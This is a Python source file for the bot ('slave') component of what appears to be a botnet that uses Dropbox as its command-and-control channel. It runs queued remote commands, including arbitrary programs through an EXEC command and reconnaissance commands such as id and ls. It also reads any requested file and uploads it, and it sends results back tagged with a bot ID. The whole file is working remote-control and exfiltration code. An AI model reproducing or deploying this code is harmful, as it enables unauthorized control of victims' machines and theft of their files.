from concurrent.futures import ThreadPoolExecutor
from threading import Thread
import subprocess
from typing import Dict, List

from common.data.commands import CommandExecutionRequest, CommandExecutionResult, CommandTypes, CommandStatus
from common.dropbox_wrapper import File
from slave.src.data.context import get_new_commands_arrived_condition, \
    get_commands_from_queue, get_bot_id
from slave.src.dropbox_handler import upload_command_result_to_dropbox, upload_copied_file

__COMMANDS_EXECUTABLE_BY_SUBPROCESS: Dict[CommandTypes, str] = {CommandTypes.W: "w",
                                                                CommandTypes.LS: "ls",
                                                                CommandTypes.ID: "id"}
__thread_pool_executor: ThreadPoolExecutor = ThreadPoolExecutor(max_workers=1)


def __run_subprocess_command(command: str, param: str) -> subprocess.CompletedProcess:
    if param == "":
        return subprocess.run([command], capture_output=True, text=True)
    return subprocess.run([command, param], capture_output=True, text=True)


def __execute_command_as_subprocess(command: CommandTypes, command_for_bash: str, param: str) -> CommandExecutionResult:
    try:
        result = __run_subprocess_command(command_for_bash, param)
    except FileNotFoundError as e:
        return CommandExecutionResult(bot_id=get_bot_id(), command=command, param=param,
                                      status=CommandStatus.ERROR, results=[e.__str__()])
    if result.stderr != "":
        return CommandExecutionResult(bot_id=get_bot_id(), command=command, param=param,
                                      status=CommandStatus.ERROR, results=[result.stderr])

    return CommandExecutionResult(bot_id=get_bot_id(), command=command, param=param,
                                  status=CommandStatus.SUCCESS, results=[result.stdout])


def __execute_command(command: CommandExecutionRequest) -> CommandExecutionResult:
    if command.command in __COMMANDS_EXECUTABLE_BY_SUBPROCESS:
        return __execute_command_as_subprocess(command.command,
                                               __COMMANDS_EXECUTABLE_BY_SUBPROCESS[command.command],
                                               command.param)
    elif command.command == CommandTypes.EXEC:
        return __execute_command_as_subprocess(command.command, command.param, "")
    elif command.command == CommandTypes.COPY:
        return __handle_copy_command(command.param)
    raise AssertionError("Unreachable state reached")


def __extract_filename_from_path(path: str) -> str:
    buffer = ""
    for char in path[::-1]:
        if char == "/":
            break
        buffer += char
    return buffer[::-1]


def __handle_copy_command(param: str) -> CommandExecutionResult:
    try:
        with open(param, "rb") as file:
            payload = file.read()
            filename = __extract_filename_from_path(param)
            upload_copied_file(filename, payload)
            return CommandExecutionResult(bot_id=get_bot_id(),
                                          command=CommandTypes.COPY,
                                          param=param,
                                          status=CommandStatus.SUCCESS,
                                          results=["File successfully copied"])
    except OSError as e:
        return CommandExecutionResult(bot_id=get_bot_id(),
                                      command=CommandTypes.COPY,
                                      param=param,
                                      status=CommandStatus.ERROR,
                                      results=[e.__str__()])


def __handle_commands() -> None:
    while True:
        with get_new_commands_arrived_condition():
            get_new_commands_arrived_condition().wait()
        command_queue = get_commands_from_queue()
        results = []
        for command in command_queue:
            results.append(__execute_command(command))
        __send_results_async(results)


def __send_results_async(results: List[CommandExecutionResult]) -> None:
    for result in results:
        __thread_pool_executor.submit(upload_command_result_to_dropbox, result)


def start_executor_job() -> Thread:
    thread = Thread(target=__handle_commands)
    thread.start()
    return thread
